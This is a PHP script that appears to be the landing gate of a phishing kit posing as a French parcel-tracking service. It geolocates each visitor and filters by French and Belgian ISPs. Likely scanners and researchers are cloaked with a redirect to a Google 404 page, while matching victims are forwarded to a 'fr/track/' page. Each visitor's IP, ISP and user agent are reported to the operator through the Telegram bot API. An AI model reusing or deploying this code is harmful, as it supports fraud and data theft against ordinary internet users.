<?php
session_start();
include('antibots.php');
$_SESSION['sessionId'] = uniqid();
include('app/functions.php');
include('common/includes.php');
$ip = $_SERVER['REMOTE_ADDR'];
$_SESSION['ip'] = $ip;
function getIpInfoo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfoo($visitor_ip);
$org = "{$ipinfo_json['as']}";
$isps = "{$ipinfo_json['isp']}";
$_SESSION['Ucity'] = "{$ipinfo_json['city']}";
$_SESSION['Uzip'] = "{$ipinfo_json['zip']}";

if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "Proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh") || strpos($org, "Telenet") || strpos($org, "telenet") || strpos($org, "sosh") || strpos($org, "proximus") || strpos($org, "Belgacom") || strpos($org, "orange") || strpos($org, "Skynet") || strpos($org, "PROXIMUS") || strpos($org, "Neuf") || strpos($org, "Numericable") || $visitor_ip == "127.0.0.1") {
    $message = "
    「 ✅ ISP AUTORISE ✅ 」
        
    「🕸」 ISP : $org
                
    「☂️」 Adresse ip : " . $_SERVER['REMOTE_ADDR'] . "
    「☔️」 User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "
        ";
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$goodisp."&text=" . urlencode($message));
    $_SESSION['bot'] = "1";
    header('location: fr/track/');
}
else {
    $_SESSION['bot'] = "0";
    $message = "
    「 🔴 ISP BLOQUE 🔴 」
        
    「🕸」 ISP : $org
                
    「☂️」 Adresse ip : " . $_SERVER['REMOTE_ADDR'] . "
    「☔️」 User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "
        ";
    file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$badisp."&text=" . urlencode($message));
    header('location: https://google.com/404');
}
?>